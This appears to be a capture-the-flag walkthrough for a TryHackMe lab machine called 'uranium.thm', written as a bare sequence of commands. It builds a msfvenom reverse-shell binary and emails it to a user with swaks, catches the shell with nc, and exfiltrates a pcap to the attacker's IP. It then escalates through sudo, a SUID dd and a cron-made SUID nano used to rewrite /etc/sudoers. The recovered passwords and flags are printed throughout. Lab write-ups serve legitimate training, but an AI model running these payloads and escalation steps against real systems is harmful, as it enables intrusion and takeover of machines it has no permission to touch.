nmap -sV -sC -Pn -oN scans/nmapsVsC 10.10.135.176

sudo vim /etc/hosts
(sudo echo '10.10.135.176   uranium.thm' >> /etc/hosts)

msfvenom
msfvenom --list payloads
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=10.18.78.209 LPORT=12345 -f elf -o application

nc -lnvp 12345

swaks -s 10.10.135.176 --attach application
  - To: hakanbey

:~sh$ ls -la /var/log

nc -lnvp 12346 > hakanbey_network_log.pcap

:~sh$ nc -w 3 10.18.78.209 12346 < /var/log/hakanbey_network_log.pcap

wireshark hakanbey_network_log.pcap &
  - Follow TCP stream
  - copy password / flag
    - MBMD1vdpjg3kGv6SsIz56VNG

:~sh$ ./chat_with_kral4
  - MBMD1vdpjg3kGv6SsIz56VNG
  - hi
  - good
  - yes
    - copy user password / flag
      - Mys3cr3tp4sw0rD

ssh hakanbey@uranium.thm

hakanbey@uranium.thm$ cat user_1.txt
  - copy flag
    - thm{2aa50e58fa82244213d5438187c0da7c}

scp ../../../HTB/machines/paper/linpeas-03-24-22-b3eefad3feb2469581b92f7043db5c348e9e5b7d.sh hakanbey@uranium.thm:/home/hakanbey/linpeas.sh

hakanbey@uranium.thm$ ./linpeas.sh
...
╔══════════╣ SUID - Check easy privesc, exploits and write perms
...
-rwsr-x--- 1 web kral4 75K Apr 23  2021 /bin/dd

hakanbey@uranium.thm$ sudo -l

hakanbey@uranium.thm$ sudo -u kral4 /bin/bash

kral4@uranium.thm$ cat user_2.txt
  - copy flag
    - thm{804d12e6d16189075db2d45449aeda5f}

kral4@uranium.thm$ cat /var/mail/kral4

kral4@uranium.thm$ ls -la /var/www/html

kral4@uranium.thm$ cd /var/www/html

kral4@uranium.thm$ /bin/dd if=web_flag.txt of=index.html

kral4@uranium.thm$ cat index.html
  - or visit website
  - copy flag
    - thm{019d332a6a223a98b955c160b3e6750a}

kral4@uranium.thm$ cat /var/mail/kral4

kral4@uranium.thm$ cd /home/kral4

kral4@uranium.thm$ which nano

kral4@uranium.thm$ cp /bin/nano .

...
wait for cron script to set SUID on nano in home folder
...

kral4@uranium.thm$ nano /etc/sudoers
  - modify sudoers file to give hakanbey ALL=(ALL:ALL) /bin/bash
    - or something similar
  - ^X
  - Y

kral4@uranium.thm$ sudo -s /bin/bash

root@uranium.thm$ cd /root

root@uranium.thm$ cat root.txt
  - copy flag
    - thm{81498047439cc0426bafa1db5da699cd}

